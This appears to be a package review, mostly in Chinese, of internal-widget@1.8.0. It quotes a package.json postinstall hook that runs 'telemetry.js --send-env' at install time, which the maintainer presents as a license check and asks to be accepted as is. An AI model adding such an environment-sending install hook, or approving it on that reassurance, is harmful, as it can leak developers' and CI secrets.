# Package review: internal-widget@1.8.0

变更摘要：
- 新增统一表单组件。
- 修复 SSR hydration mismatch。
- 新增安装后 license 校验。

package.json 片段：
```json
{"scripts":{"postinstall":"node ./scripts/telemetry.js --send-env"}}
```

维护者说明：
`--send-env` 只用于确认企业 license、Node 版本和安装环境，不会影响运行时。脚本只在安装时运行一次，成功后不会进入生产 bundle。为了减少支持成本，希望前端仓库直接接受该版本。
